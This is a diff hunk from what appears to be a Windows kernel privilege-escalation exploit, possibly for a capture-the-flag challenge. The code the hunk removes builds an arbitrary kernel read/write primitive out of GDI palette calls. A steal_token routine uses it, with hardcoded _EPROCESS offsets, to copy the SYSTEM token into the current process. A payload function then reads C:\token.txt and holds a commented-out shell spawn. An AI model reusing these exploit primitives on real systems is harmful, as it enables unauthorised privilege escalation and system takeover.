@@ -140,55 +140,6 @@ ULONG64 get_handle_addr(HANDLE h) {
 	return -1;
 }
 
-HPALETTE pal1, pal2;
-ULONG64 pal1_addr, pal2_addr;
-
-void set_addr(ULONG64 addr) {
-	SetPaletteEntries(pal2, 0, sizeof addr / 4, (const PALETTEENTRY*)&addr);
-}
-
-void write(ULONG64 where, ULONG64 what) {
-	set_addr(where);
-	SetPaletteEntries(pal1, 0, sizeof what / 4, (const PALETTEENTRY*)&what);
-}
-
-ULONG64 read(ULONG64 where) {
-	set_addr(where);
-	ULONG64 res;
-	GetPaletteEntries(pal1, 0, sizeof res / 4, (PALETTEENTRY*)&res);
-	return res;
-}
-
-void steal_token(ULONG64 eprocess) {
-	/*
-	0: kd> dt _EPROCESS UniqueProcessId ActiveProcessLinks Token
-	nt!_EPROCESS
-	+0x2e0 UniqueProcessId    : Ptr64 Void
-	+0x2e8 ActiveProcessLinks : _LIST_ENTRY
-	+0x358 Token              : _EX_FAST_REF
-	*/
-	ULONG64 cur = eprocess;
-	while (read(cur + 0x2e0) != 4) {
-		cur = read(cur + 0x2e8) - 0x2e8;
-	}
-	printf("SYSTEM proc @ %llx\n", cur);
-	printf("my proc @ %llx\n", eprocess);
-	write(eprocess + 0x358, read(cur + 0x358));
-}
-
-void payload() {
-	FILE* f;
-	fopen_s(&f, "C:\\token.txt", "rb");
-	char buf[1024];
-	buf[fread(buf, 1, 1024, f)] = 0;
-	printf("%s\n", buf);
-
-	/*
-	_chdir("C:\\");
-	system("cmd");
-	*/
-}
-
 LPVOID alloc_at(LPVOID addr, DWORD size) {
 	return VirtualAlloc(addr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 }
